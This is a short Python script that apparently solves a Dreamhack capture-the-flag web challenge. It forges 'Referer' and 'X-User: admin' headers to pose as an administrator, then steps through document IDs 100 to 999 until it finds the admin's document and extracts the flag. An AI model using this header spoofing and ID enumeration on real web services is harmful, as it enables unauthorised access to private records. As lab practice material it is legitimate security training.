import re
import requests

host = 'http://host3.dreamhack.games:23205/'

header = {
    'Referer': '/share',
    'X-User': 'admin'
}

for i in range(100, 1000):
    res = requests.get(host + 'doc/' + str(i), headers=header)
    if 'System Administrator' in res.text:
        print(re.search(r'DH{.*?}', res.text))
        break
